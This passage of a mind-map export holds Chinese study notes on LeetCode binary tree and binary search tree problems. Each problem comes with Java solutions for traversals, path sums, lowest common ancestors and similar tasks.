    if (root.left == null &amp;&amp; root.right == null &amp;&amp; root.val == sum) return true;
    return hasPathSum(root.left, sum - root.val) || hasPathSum(root.right, sum - root.val);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1122326636" CREATED="1754751555176" MODIFIED="1754751555178"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      7. 统计路径和等于一个数的路径数量
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      437. Path Sum III (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/path-sum-iii/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/path-sum-iii/description/">力扣</a>
    </p>
    <pre>root = [10,5,-3,3,2,null,11,3,-2,null,1], sum = 8
      10
     /  \
    5   -3
   / \    \
  3   2   11
 / \   \
3  -2   1
Return 3. The paths that sum to 8 are:
1.  5 -&gt; 3
2.  5 -&gt; 2 -&gt; 1
3. -3 -&gt; 11</pre>
    <p>
      路径不一定以 root 开头，也不一定以 leaf 结尾，但是必须连续。
    </p>
    <pre>public int pathSum(TreeNode root, int sum) {
    if (root == null) return 0;
    int ret = pathSumStartWithRoot(root, sum) + pathSum(root.left, sum) + pathSum(root.right, sum);
    return ret;
}
private int pathSumStartWithRoot(TreeNode root, int sum) {
    if (root == null) return 0;
    int ret = 0;
    if (root.val == sum) ret++;
    ret += pathSumStartWithRoot(root.left, sum - root.val) + pathSumStartWithRoot(root.right, sum - root.val);
    return ret;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_501918087" CREATED="1754751555178" MODIFIED="1754751555179"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      8. 子树
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      572. Subtree of Another Tree (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/subtree-of-another-tree/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/subtree-of-another-tree/description/">力扣</a>
    </p>
    <pre>Given tree s:
     3
    / \
   4   5
  / \
 1   2
Given tree t:
   4
  / \
 1   2
Return true, because t has the same structure and node values with a subtree of s.
Given tree s:
     3
    / \
   4   5
  / \
 1   2
    /
   0
Given tree t:
   4
  / \
 1   2
Return false.</pre>
    <pre>public boolean isSubtree(TreeNode s, TreeNode t) {
    if (s == null) return false;
    return isSubtreeWithRoot(s, t) || isSubtree(s.left, t) || isSubtree(s.right, t);
}
private boolean isSubtreeWithRoot(TreeNode s, TreeNode t) {
    if (t == null &amp;&amp; s == null) return true;
    if (t == null || s == null) return false;
    if (t.val != s.val) return false;
    return isSubtreeWithRoot(s.left, t.left) &amp;&amp; isSubtreeWithRoot(s.right, t.right);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_579328093" CREATED="1754751555181" MODIFIED="1754751555182"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      9. 树的对称
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      101. Symmetric Tree (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/symmetric-tree/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/symmetric-tree/description/">力扣</a>
    </p>
    <pre>1
   / \
  2   2
 / \ / \
3  4 4  3</pre>
    <pre>public boolean isSymmetric(TreeNode root) {
    if (root == null) return true;
    return isSymmetric(root.left, root.right);
}
private boolean isSymmetric(TreeNode t1, TreeNode t2) {
    if (t1 == null &amp;&amp; t2 == null) return true;
    if (t1 == null || t2 == null) return false;
    if (t1.val != t2.val) return false;
    return isSymmetric(t1.left, t2.right) &amp;&amp; isSymmetric(t1.right, t2.left);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1676924310" CREATED="1754751555183" MODIFIED="1754751555185"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      10. 最小路径
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      111. Minimum Depth of Binary Tree (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/minimum-depth-of-binary-tree/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/minimum-depth-of-binary-tree/description/">力扣</a>
    </p>
    <p>
      树的根节点到叶子节点的最小路径长度
    </p>
    <pre>public int minDepth(TreeNode root) {
    if (root == null) return 0;
    int left = minDepth(root.left);
    int right = minDepth(root.right);
    if (left == 0 || right == 0) return left + right + 1;
    return Math.min(left, right) + 1;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_67758750" CREATED="1754751555185" MODIFIED="1754751555187"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      11. 统计左叶子节点的和
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      404. Sum of Left Leaves (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/sum-of-left-leaves/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/sum-of-left-leaves/description/">力扣</a>
    </p>
    <pre>3
   / \
  9  20
    /  \
   15   7
There are two left leaves in the binary tree, with values 9 and 15 respectively. Return 24.</pre>
    <pre>public int sumOfLeftLeaves(TreeNode root) {
    if (root == null) return 0;
    if (isLeaf(root.left)) return root.left.val + sumOfLeftLeaves(root.right);
    return sumOfLeftLeaves(root.left) + sumOfLeftLeaves(root.right);
}
private boolean isLeaf(TreeNode node){
    if (node == null) return false;
    return node.left == null &amp;&amp; node.right == null;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1214652679" CREATED="1754751555187" MODIFIED="1754751555189"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      12. 相同节点值的最大路径长度
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      687. Longest Univalue Path (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/longest-univalue-path/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/longest-univalue-path/">力扣</a>
    </p>
    <pre>1
            / \
           4   5
          / \   \
         4   4   5
Output : 2</pre>
    <pre>private int path = 0;
public int longestUnivaluePath(TreeNode root) {
    dfs(root);
    return path;
}
private int dfs(TreeNode root){
    if (root == null) return 0;
    int left = dfs(root.left);
    int right = dfs(root.right);
    int leftPath = root.left != null &amp;&amp; root.left.val == root.val ? left + 1 : 0;
    int rightPath = root.right != null &amp;&amp; root.right.val == root.val ? right + 1 : 0;
    path = Math.max(path, leftPath + rightPath);
    return Math.max(leftPath, rightPath);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1560246369" CREATED="1754751555189" MODIFIED="1754751555192"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      13. 间隔遍历
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      337. House Robber III (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/house-robber-iii/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/house-robber-iii/description/">力扣</a>
    </p>
    <pre>3
    / \
   2   3
    \   \
     3   1
Maximum amount of money the thief can rob = 3 + 3 + 1 = 7.</pre>
    <pre>Map&lt;TreeNode, Integer&gt; cache = new HashMap&lt;&gt;(); 
public int rob(TreeNode root) {
    if (root == null) return 0;
    if (cache.containsKey(root)) return cache.get(root);
    int val1 = root.val;
    if (root.left != null) val1 += rob(root.left.left) + rob(root.left.right);
    if (root.right != null) val1 += rob(root.right.left) + rob(root.right.right);
    int val2 = rob(root.left) + rob(root.right);
    int res = Math.max(val1, val2);
    cache.put(root, res);
    return res;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1005446211" CREATED="1754751555193" MODIFIED="1754751555197"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      14. 找出二叉树中第二小的节点
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      671. Second Minimum Node In a Binary Tree (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/second-minimum-node-in-a-binary-tree/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/second-minimum-node-in-a-binary-tree/description/">力扣</a>
    </p>
    <pre>Input:
   2
  / \
 2   5
    / \
    5  7
Output: 5</pre>
    <p>
      一个节点要么具有 0 个或 2 个子节点，如果有子节点，那么根节点是最小的节点。
    </p>
    <pre>public int findSecondMinimumValue(TreeNode root) {
    if (root == null) return -1;
    if (root.left == null &amp;&amp; root.right == null) return -1;
    int leftVal = root.left.val;
    int rightVal = root.right.val;
    if (leftVal == root.val) leftVal = findSecondMinimumValue(root.left);
    if (rightVal == root.val) rightVal = findSecondMinimumValue(root.right);
    if (leftVal != -1 &amp;&amp; rightVal != -1) return Math.min(leftVal, rightVal);
    if (leftVal != -1) return leftVal;
    return rightVal;
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_126488772" CREATED="1754751555197" MODIFIED="1754751555199"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      层次遍历
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      使用 BFS 进行层次遍历。不需要使用两个队列来分别存储当前层的节点和下一层的节点，因为在开始遍历一层的节点时，当前队列中的节点数就是当前层的节点数，只要控制遍历这么多节点数，就能保证这次遍历的都是当前层的节点。
    </p>
  </body>
</html></richcontent>
<node ID="ID_389746432" CREATED="1754751555200" MODIFIED="1754751555202"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 一棵树每层节点的平均数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      637. Average of Levels in Binary Tree (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/average-of-levels-in-binary-tree/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/average-of-levels-in-binary-tree/description/">力扣</a>
    </p>
    <pre>public List&lt;Double&gt; averageOfLevels(TreeNode root) {
    List&lt;Double&gt; ret = new ArrayList&lt;&gt;();
    if (root == null) return ret;
    Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;();
    queue.add(root);
    while (!queue.isEmpty()) {
        int cnt = queue.size();
        double sum = 0;
        for (int i = 0; i &lt; cnt; i++) {
            TreeNode node = queue.poll();
            sum += node.val;
            if (node.left != null) queue.add(node.left);
            if (node.right != null) queue.add(node.right);
        }
        ret.add(sum / cnt);
    }
    return ret;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_486891849" CREATED="1754751555202" MODIFIED="1754751555204"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 得到左下角的节点
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      513. Find Bottom Left Tree Value (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/find-bottom-left-tree-value/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/find-bottom-left-tree-value/description/">力扣</a>
    </p>
    <pre>Input:
        1
       / \
      2   3
     /   / \
    4   5   6
       /
      7
Output:
7</pre>
    <pre>public int findBottomLeftValue(TreeNode root) {
    Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;();
    queue.add(root);
    while (!queue.isEmpty()) {
        root = queue.poll();
        if (root.right != null) queue.add(root.right);
        if (root.left != null) queue.add(root.left);
    }
    return root.val;
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_918387778" CREATED="1754751555204" MODIFIED="1754751555206"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      前中后序遍历
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <pre>1
   / \
  2   3
 / \   \
4   5   6</pre>
    <ul>
      <li>
        层次遍历顺序：[1 2 3 4 5 6]
      </li>
      <li>
        前序遍历顺序：[1 2 4 5 3 6]
      </li>
      <li>
        中序遍历顺序：[4 2 5 1 3 6]
      </li>
      <li>
        后序遍历顺序：[4 5 2 6 3 1]
      </li>
    </ul>
    <p>
      层次遍历使用 BFS 实现，利用的就是 BFS 一层一层遍历的特性；而前序、中序、后序遍历利用了 DFS 实现。
    </p>
    <p>
      前序、中序、后序遍只是在对节点访问的顺序有一点不同，其它都相同。
    </p>
    <p>
      ① 前序
    </p>
    <pre>void dfs(TreeNode root) {
    visit(root);
    dfs(root.left);
    dfs(root.right);
}</pre>
    <p>
      ② 中序
    </p>
    <pre>void dfs(TreeNode root) {
    dfs(root.left);
    visit(root);
    dfs(root.right);
}</pre>
    <p>
      ③ 后序
    </p>
    <pre>void dfs(TreeNode root) {
    dfs(root.left);
    dfs(root.right);
    visit(root);
}</pre>
  </body>
</html></richcontent>
<node ID="ID_349712397" CREATED="1754751555206" MODIFIED="1754751555208"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 非递归实现二叉树的前序遍历
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      144. Binary Tree Preorder Traversal (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/binary-tree-preorder-traversal/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/binary-tree-preorder-traversal/description/">力扣</a>
    </p>
    <pre>public List&lt;Integer&gt; preorderTraversal(TreeNode root) {
    List&lt;Integer&gt; ret = new ArrayList&lt;&gt;();
    Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;();
    stack.push(root);
    while (!stack.isEmpty()) {
        TreeNode node = stack.pop();
        if (node == null) continue;
        ret.add(node.val);
        stack.push(node.right);  // 先右后左，保证左子树先遍历
        stack.push(node.left);
    }
    return ret;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_206623455" CREATED="1754751555208" MODIFIED="1754751555209"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 非递归实现二叉树的后序遍历
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      145. Binary Tree Postorder Traversal (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/binary-tree-postorder-traversal/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/binary-tree-postorder-traversal/description/">力扣</a>
    </p>
    <p>
      前序遍历为 root -&gt; left -&gt; right，后序遍历为 left -&gt; right -&gt; root。可以修改前序遍历成为 root -&gt; right -&gt; left，那么这个顺序就和后序遍历正好相反。
    </p>
    <pre>public List&lt;Integer&gt; postorderTraversal(TreeNode root) {
    List&lt;Integer&gt; ret = new ArrayList&lt;&gt;();
    Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;();
    stack.push(root);
    while (!stack.isEmpty()) {
        TreeNode node = stack.pop();
        if (node == null) continue;
        ret.add(node.val);
        stack.push(node.left);
        stack.push(node.right);
    }
    Collections.reverse(ret);
    return ret;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1847163696" CREATED="1754751555210" MODIFIED="1754751555211"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 非递归实现二叉树的中序遍历
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      94. Binary Tree Inorder Traversal (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/binary-tree-inorder-traversal/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/binary-tree-inorder-traversal/description/">力扣</a>
    </p>
    <pre>public List&lt;Integer&gt; inorderTraversal(TreeNode root) {
    List&lt;Integer&gt; ret = new ArrayList&lt;&gt;();
    if (root == null) return ret;
    Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;();
    TreeNode cur = root;
    while (cur != null || !stack.isEmpty()) {
        while (cur != null) {
            stack.push(cur);
            cur = cur.left;
        }
        TreeNode node = stack.pop();
        ret.add(node.val);
        cur = node.right;
    }
    return ret;
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1367037037" CREATED="1754751555212" MODIFIED="1754751555213"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      BST
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      二叉查找树（BST）：根节点大于等于左子树所有节点，小于等于右子树所有节点。
    </p>
    <p>
      二叉查找树中序遍历有序。
    </p>
  </body>
</html></richcontent>
<node ID="ID_956609736" CREATED="1754751555213" MODIFIED="1754751555215"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 修剪二叉查找树
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      669. Trim a Binary Search Tree (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/trim-a-binary-search-tree/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/trim-a-binary-search-tree/description/">力扣</a>
    </p>
    <pre>Input:
    3
   / \
  0   4
   \
    2
   /
  1
  L = 1
  R = 3
Output:
      3
     /
   2
  /
 1</pre>
    <p>
      题目描述：只保留值在 L ~ R 之间的节点
    </p>
    <pre>public TreeNode trimBST(TreeNode root, int L, int R) {
    if (root == null) return null;
    if (root.val &gt; R) return trimBST(root.left, L, R);
    if (root.val &lt; L) return trimBST(root.right, L, R);
    root.left = trimBST(root.left, L, R);
    root.right = trimBST(root.right, L, R);
    return root;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_235813300" CREATED="1754751555215" MODIFIED="1754751555217"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 寻找二叉查找树的第 k 个元素
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      230. Kth Smallest Element in a BST (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/kth-smallest-element-in-a-bst/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/kth-smallest-element-in-a-bst/description/">力扣</a>
    </p>
    <p>
      中序遍历解法：
    </p>
    <pre>private int cnt = 0;
private int val;
public int kthSmallest(TreeNode root, int k) {
    inOrder(root, k);
    return val;
}
private void inOrder(TreeNode node, int k) {
    if (node == null) return;
    inOrder(node.left, k);
    cnt++;
    if (cnt == k) {
        val = node.val;
        return;
    }
    inOrder(node.right, k);
}</pre>
    <p>
      递归解法：
    </p>
    <pre>public int kthSmallest(TreeNode root, int k) {
    int leftCnt = count(root.left);
    if (leftCnt == k - 1) return root.val;
    if (leftCnt &gt; k - 1) return kthSmallest(root.left, k);
    return kthSmallest(root.right, k - leftCnt - 1);
}
private int count(TreeNode node) {
    if (node == null) return 0;
    return 1 + count(node.left) + count(node.right);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_930405320" CREATED="1754751555217" MODIFIED="1754751555219"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 把二叉查找树每个节点的值都加上比它大的节点的值
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      Convert BST to Greater Tree (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/convert-bst-to-greater-tree/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/convert-bst-to-greater-tree/description/">力扣</a>
    </p>
    <pre>Input: The root of a Binary Search Tree like this:
              5
            /   \
           2     13
Output: The root of a Greater Tree like this:
             18
            /   \
          20     13</pre>
    <p>
      先遍历右子树。
    </p>
    <pre>private int sum = 0;
public TreeNode convertBST(TreeNode root) {
    traver(root);
    return root;
}
private void traver(TreeNode node) {
    if (node == null) return;
    traver(node.right);
    sum += node.val;
    node.val = sum;
    traver(node.left);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1727738220" CREATED="1754751555219" MODIFIED="1754751555221"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 二叉查找树的最近公共祖先
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      235. Lowest Common Ancestor of a Binary Search Tree (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/lowest-common-ancestor-of-a-binary-search-tree/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree/description/">力扣</a>
    </p>
    <pre>_______6______
      /                \
  ___2__             ___8__
 /      \           /      \
0        4         7        9
        /  \
       3   5
For example, the lowest common ancestor (LCA) of nodes 2 and 8 is 6. Another example is LCA of nodes 2 and 4 is 2, since a node can be a descendant of itself according to the LCA definition.</pre>
    <pre>public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) {
    if (root.val &gt; p.val &amp;&amp; root.val &gt; q.val) return lowestCommonAncestor(root.left, p, q);
    if (root.val &lt; p.val &amp;&amp; root.val &lt; q.val) return lowestCommonAncestor(root.right, p, q);
    return root;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1181360129" CREATED="1754751555221" MODIFIED="1754751555223"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 二叉树的最近公共祖先
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      236. Lowest Common Ancestor of a Binary Tree (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/lowest-common-ancestor-of-a-binary-tree/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-tree/description/">力扣</a>
    </p>
    <pre>_______3______
      /              \
  ___5__           ___1__
 /      \         /      \
6        2       0        8
        /  \
       7    4
For example, the lowest common ancestor (LCA) of nodes 5 and 1 is 3. Another example is LCA of nodes 5 and 4 is 5, since a node can be a descendant of itself according to the LCA definition.</pre>
    <pre>public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) {
    if (root == null || root == p || root == q) return root;
    TreeNode left = lowestCommonAncestor(root.left, p, q);
    TreeNode right = lowestCommonAncestor(root.right, p, q);
    return left == null ? right : right == null ? left : root;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1839740354" CREATED="1754751555223" MODIFIED="1754751555225"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. 从有序数组中构造二叉查找树
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      108. Convert Sorted Array to Binary Search Tree (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/convert-sorted-array-to-binary-search-tree/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/convert-sorted-array-to-binary-search-tree/description/">力扣</a>
    </p>
    <pre>public TreeNode sortedArrayToBST(int[] nums) {
    return toBST(nums, 0, nums.length - 1);
}
private TreeNode toBST(int[] nums, int sIdx, int eIdx){
    if (sIdx &gt; eIdx) return null;
    int mIdx = (sIdx + eIdx) / 2;
    TreeNode root = new TreeNode(nums[mIdx]);
    root.left =  toBST(nums, sIdx, mIdx - 1);
    root.right = toBST(nums, mIdx + 1, eIdx);
    return root;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_13111794" CREATED="1754751555225" MODIFIED="1754751555227"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      7. 根据有序链表构造平衡的二叉查找树
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      109. Convert Sorted List to Binary Search Tree (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/convert-sorted-list-to-binary-search-tree/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/convert-sorted-list-to-binary-search-tree/description/">力扣</a>
    </p>
    <pre>Given the sorted linked list: [-10,-3,0,5,9],
One possible answer is: [0,-3,9,-10,null,5], which represents the following height balanced BST:
      0
     / \
   -3   9
   /   /
 -10  5</pre>
    <pre>public TreeNode sortedListToBST(ListNode head) {
    if (head == null) return null;
    if (head.next == null) return new TreeNode(head.val);
    ListNode preMid = preMid(head);
    ListNode mid = preMid.next;
    preMid.next = null;  // 断开链表
    TreeNode t = new TreeNode(mid.val);
    t.left = sortedListToBST(head);
    t.right = sortedListToBST(mid.next);
    return t;
}
private ListNode preMid(ListNode head) {
    ListNode slow = head, fast = head.next;
    ListNode pre = head;
    while (fast != null &amp;&amp; fast.next != null) {
        pre = slow;
        slow = slow.next;
        fast = fast.next.next;
    }
    return pre;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_112698172" CREATED="1754751555227" MODIFIED="1754751555229"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      8. 在二叉查找树中寻找两个节点，使它们的和为一个给定值
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      653. Two Sum IV - Input is a BST (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/two-sum-iv-input-is-a-bst/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/two-sum-iv-input-is-a-bst/description/">力扣</a>
    </p>
    <pre>Input:
    5
   / \
  3   6
 / \   \
2   4   7
Target = 9
Output: True</pre>
    <p>
      使用中序遍历得到有序数组之后，再利用双指针对数组进行查找。
    </p>
    <p>
      应该注意到，这一题不能用分别在左右子树两部分来处理这种思想，因为两个待求的节点可能分别在左右子树中。
    </p>
    <pre>public boolean findTarget(TreeNode root, int k) {
    List&lt;Integer&gt; nums = new ArrayList&lt;&gt;();
    inOrder(root, nums);
    int i = 0, j = nums.size() - 1;
    while (i &lt; j) {
        int sum = nums.get(i) + nums.get(j);
        if (sum == k) return true;
        if (sum &lt; k) i++;
        else j--;
    }
    return false;
}
private void inOrder(TreeNode root, List&lt;Integer&gt; nums) {
    if (root == null) return;
    inOrder(root.left, nums);
    nums.add(root.val);
    inOrder(root.right, nums);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1378586267" CREATED="1754751555229" MODIFIED="1754751555231"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      9. 在二叉查找树中查找两个节点之差的最小绝对值
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      530. Minimum Absolute Difference in BST (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/minimum-absolute-difference-in-bst/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst/description/">力扣</a>
    </p>
    <pre>Input:
   1
    \
     3
    /
   2
Output:
1</pre>
    <p>
      利用二叉查找树的中序遍历为有序的性质，计算中序遍历中临近的两个节点之差的绝对值，取最小值。
    </p>
    <pre>private int minDiff = Integer.MAX_VALUE;
private TreeNode preNode = null;
public int getMinimumDifference(TreeNode root) {
    inOrder(root);
    return minDiff;
}
private void inOrder(TreeNode node) {
    if (node == null) return;
    inOrder(node.left);
    if (preNode != null) minDiff = Math.min(minDiff, node.val - preNode.val);
    preNode = node;
    inOrder(node.right);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1673291844" CREATED="1754751555231" MODIFIED="1754751555233"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      10. 寻找二叉查找树中出现次数最多的值
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      501. Find Mode in Binary Search Tree (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/find-mode-in-binary-search-tree/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/find-mode-in-binary-search-tree/description/">力扣</a>
    </p>
    <pre>1
    \
     2
    /
   2
return [2].</pre>
    <p>
      答案可能不止一个，也就是有多个值出现的次数一样多。
    </p>
    <pre>private int curCnt = 1;
private int maxCnt = 1;
private TreeNode preNode = null;
public int[] findMode(TreeNode root) {
    List&lt;Integer&gt; maxCntNums = new ArrayList&lt;&gt;();
    inOrder(root, maxCntNums);
    int[] ret = new int[maxCntNums.size()];
    int idx = 0;
    for (int num : maxCntNums) {
        ret[idx++] = num;
    }
    return ret;
}
private void inOrder(TreeNode node, List&lt;Integer&gt; nums) {
    if (node == null) return;
    inOrder(node.left, nums);
    if (preNode != null) {
        if (preNode.val == node.val) curCnt++;
        else curCnt = 1;
    }
    if (curCnt &gt; maxCnt) {
        maxCnt = curCnt;
        nums.clear();
        nums.add(node.val);
    } else if (curCnt == maxCnt) {
        nums.add(node.val);
    }
    preNode = node;
    inOrder(node.right, nums);
}</pre>
  </body>
</html></richcontent>
</node>
</node>
